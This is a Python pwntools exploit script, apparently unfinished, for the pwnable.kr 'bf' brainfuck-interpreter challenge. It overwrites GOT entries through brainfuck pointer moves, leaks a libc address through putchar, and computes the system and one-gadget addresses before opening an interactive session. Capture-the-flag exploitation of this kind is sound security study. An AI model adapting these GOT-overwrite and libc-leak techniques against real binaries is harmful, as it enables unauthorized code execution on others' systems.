import struct
from pwn import *

BF_LIBC_PATH = "bf_libc.so"

GOT_ADDRESSES = {"getchar": 0x804a00c, "fgets": 0x804a010, "memset": 0x804a02c,
                 "putchar": 0x0804a030}

P_ADDRESS = 0x0804a0a0

START_ADDRESS = 0x80484e0

# The address that the got getchar entry points to.
GETCHAR_ADDRESS = 0x8048446


def move_addresses(address1: int, address2: int, direction: str) -> bytes:
    return (direction * (address2 - address1)).encode()


def add_address(address1: int, address2: int) -> bytes:
    return b'+' * (address2 - address1)


def sub_address(address1: int, address2: int) -> bytes:
    return b'-' * (address1 - address2)


def main():
    """
    Find the offsets of putchar and system.
    """
    libc = ELF(BF_LIBC_PATH)

    system_offset = libc.symbols["system"]
    log.info(f"System libc offset : {hex(system_offset)}")
    putchar_offset = libc.symbols["putchar"]
    log.info(f"Putchar libc offset : {hex(putchar_offset)}")

    system_gadget_offset = 0x5fbd5

    """
    Sets ups the connections and the payload.
    """

    shell = remote("pwnable.kr", 9001)

    response = shell.recvuntil(b"type some brainfuck instructions except [ ]\n")

    log.info(f"Response: {response}")

    """"
    Turns the make the got of getchar point to _start so when we use , it will restart the program.
    """
    leak_libc_payload = b""

    leak_libc_payload += move_addresses(GOT_ADDRESSES["getchar"], P_ADDRESS, "<")
    leak_libc_payload += add_address(GETCHAR_ADDRESS, START_ADDRESS)

    """
    Leaks the address of libc by calling putchar using . and then printing the loaded address.
    Then runs the program again after we got the leaked libc address.
    """
    leak_libc_payload += move_addresses(GOT_ADDRESSES["getchar"], GOT_ADDRESSES["putchar"], ">")
    leak_libc_payload += b"..>.>.>."

    # Calls the overwritten putchar to run the program again after we know the libc address.
    leak_libc_payload += b','

    print(leak_libc_payload)
    shell.sendline(leak_libc_payload)

    leaked_libc_address = b""

    shell.recv(1)
    leaked_libc_address += shell.recv(1)
    leaked_libc_address += shell.recv(1)
    leaked_libc_address += shell.recv(1)
    leaked_libc_address += shell.recv(1)

    leaked_libc_address = struct.unpack("I", leaked_libc_address)[0]

    """
    Uses the leaked address of the libc to find the base address of libc and the address of system.
    """
    log.info(f"Leaked libc : {hex(leaked_libc_address)}")

    base_libc_address = leaked_libc_address - putchar_offset
    log.info(f"Base libc address {hex(base_libc_address)}")

    system_libc_address = base_libc_address + system_offset
    log.info(f"System libc address {hex(system_libc_address)}")

    system_gadget_libc_address = base_libc_address + system_gadget_offset
    log.info(f"System gadget libc address {hex(system_gadget_libc_address)}")

    putchar_libc_address = base_libc_address + putchar_offset
    log.info(f"putchar libc address {hex(putchar_libc_address)}")

    """
    Leaks the address of libc by calling putchar using . and then printing the loaded address.
    Then runs the program again after we got the leaked libc address.
    """

    log.info("Restarting the program")

    response = shell.recvuntil(b"type some brainfuck instructions except [ ]\n")
    log.info(f"Response: {response}")

    shell.sendline(leak_libc_payload)

    log.info("Restarting the program")
    response = shell.recvuntil(b"type some brainfuck instructions except [ ]\n")
    log.info(f"Response: {response}")

    shell.sendline(leak_libc_payload)

    log.info("Restarting the program")
    response = shell.recvuntil(b"type some brainfuck instructions except [ ]\n")
    log.info(f"Response: {response}")

    print(len(leak_libc_payload))

    """
    Triggers the gadget.
    """
    #final_gadget_payload = sub_address()


    shell.interactive()


if __name__ == "__main__":
    main()
